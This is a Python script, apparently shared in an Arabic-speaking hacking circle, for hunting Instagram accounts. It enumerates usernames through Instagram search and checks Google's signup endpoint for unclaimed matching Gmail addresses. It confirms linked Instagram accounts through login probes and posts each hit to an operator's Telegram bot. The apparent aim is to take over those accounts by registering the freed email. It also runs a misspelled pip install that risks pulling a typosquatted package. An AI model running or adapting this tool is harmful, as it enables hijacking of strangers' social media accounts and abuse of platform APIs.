try:
	import requests,os,names,random,time,requests,sys
	from user_agent import generate_user_agent
	from uuid import uuid4
except:
	os.system("pip install requsets")
	os.system("pip install names")
	os.system("pip install user_agent")
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("clear")
import requests,os,names,json,random
import requests,os,names,random,time
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
import requests,random,requests,time
import requests,random,requests,datetime


import requests
import os
from uuid import uuid4
import random
from user_agent import generate_user_agent
import datetime
import json
from time import sleep
from os import system
from datetime import date
import socket

os.system('clear')
#------------------------------[الالوان]------------------------------
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C1 = '\033[2;35m'



def obot():
  
  azro = (f"""    
  
  
  
  تم تحديت اتصالات ورجعت سيزن لتقليل الحضر



     """)
  for azr in azro.splitlines():
    time.sleep(0.05)
    print(azr+X)
obot()
uid = uuid4()


sid = input(Z+'سيزن ايدي   :'+B)


token = input(B+f'توكن    :'+Z)

ID = input(Z+f'ايدي      :'+B)








i =0 
SS =0
BB =0
YY =0
head={'Cookie':'dpr=0.800000011920929; mid=ZFUivQALAAHpI4XTcnM4SM4_bP6m; ig_nrcb=1; ig_did=7934DFC8-E3A7-4FC7-A1B3-CE3564F62EBE; csrftoken=xoDu2ejh9LIhqYaYdSw8MR84MjKCxVtK; datr=syJVZOXOfpBwIMmGdnkxqnDa; sessionid='+sid}

def check(email,user): 
 user=str(user)
 email=str(email)
 global SS 
 global BB
 global YY
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'multipart/form-data; boundary=---------------------------193884358266537625728240628',
              'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'@whisper666',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}

 req= requests.post(url, headers=headers, data=data).json()
 if req['message'] == 'The password you entered is incorrect. Please try again.':
   rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()
   
   nam = str(rr['graphql']['user']['full_name'])
   iddd = str(rr['graphql']['user']['id'])
   fol = str(rr['graphql']['user']['edge_followed_by']['count'])
   fols =str(rr['graphql']['user']['edge_follow']['count'])
   isp = str(rr['graphql']['user']['is_private'])
   bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
   re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
   ree = re.json()
   dat = ree['date']
   
   YY+=1
   tlg =(f"""
عٌثًمًآنِ جّآبً لَکْ حًسِآبً 🥳
꧁___꧂
😜 Hit » {YY}
😜 Name » {nam}
😜 UserName » {user}
😜 Email » {email}
😜 Followers » {fol}
😜 Following » {fols}
😜 Private » {isp}
😜 Data » {dat}
😜 Link » https://www.instagram.com/{user}
꧁___꧂
BY: @qcvqq
""")
   


   
   os.system('cls' if os.name == 'nt' else 'clear')
   
   print(f'{B} {F}')
   print(f'   ❖ {C1}{X} {email}    ')
   print('•••••••••••••••••••••••••••••••••')
   print(f' {C1} {R}{F}❖{R} {F}Good {B}      : {F}{SS}            \n {C1} {R}{R}❖{R} {R}Bad Mail {B}  : {R}{i}      {C1}       \n  {R}{X}❖{R} {X}BaD Insta  {B}: {X}{BB}    {F}        ')
   print('•••••••••••••••••••••••••••••••••')
   print(' BY : @qcvqq')
   SS+=1
   requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
   os.system('cls' if os.name == 'nt' else 'clear')
   
   print(f'{B} {F}')
   print(f'   ❖ {C1}{X} {email}    ')
   print('•••••••••••••••••••••••••••••••••')
   print(f' {C1} {R}{F}❖{R} {F}Good {B}      : {F}{SS}            \n {C1} {R}{R}❖{R} {R}Bad Mail {B}  : {R}{i}      {C1}       \n  {R}{X}❖{R} {X}BaD Insta  {B}: {X}{BB}    {F}        ')
   print('•••••••••••••••••••••••••••••••••')
   print(' BY : @qcvqq')
   BB+=1
   

def yahoo(email,user):
  global i
  
  
  eml=str(email)
  email=eml.split('@')[0]+'@gmail.com'
  url = 'https://android.clients.google.com/setup/checkavail'
  i +=1
  h = {
    'Content-Length':'98',
    'Content-Type':'text/plain; charset=UTF-8',
    'Host':'android.clients.google.com',
    'Connection':'Keep-Alive',
    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
    }
  d = json.dumps({
    'username':email,
    'version':'3',
    'firstName':'AbaLahb',
    'lastName':'AbuJahl'
  })
  res = requests.post(url,data=d,headers=h)
  if res.json()['status'] == 'SUCCESS':
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'{B} {F}')
    print(f'   ❖ {C1}{X} {email}    ')
    print('•••••••••••••••••••••••••••••••••')
    print(f' {C1} {R}{F}❖{R} {F}Good {B}      : {F}{SS}            \n {C1} {R}{R}❖{R} {R}Bad Mail {B}  : {R}{i}      {C1}       \n  {R}{X}❖{R} {X}BaD Insta  {B}: {X}{BB}    {F}        ')
    print('•••••••••••••••••••••••••••••••••')
    print(' BY : @qcvqq')
    check(email,user)
  else:
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'{B} {F}')
    print(f'   ❖ {C1}{X} {email}    ')
    print('•••••••••••••••••••••••••••••••••')
    print(f' {C1} {R}{F}❖{R} {F}Good {B}      : {F}{SS}            \n {C1} {R}{R}❖{R} {R}Bad Mail {B}  : {R}{i}      {C1}       \n  {R}{X}❖{R} {X}BaD Insta  {B}: {X}{BB}    {F}        ')
    print('•••••••••••••••••••••••••••••••••')
    print(' BY : @qcvqq')
def users():
 while True:
  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
  num='6789'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
  mn=0
  try:
   while True:
    mn += 1
    user=str(whisper['users'][mn]['user']['username'])
    emai=user
    email=emai+'@gmail.com'
    if '_' in str(email):
      
      continue
    else :
      
      yahoo(email,user)
  except IndexError:
   users()
users()
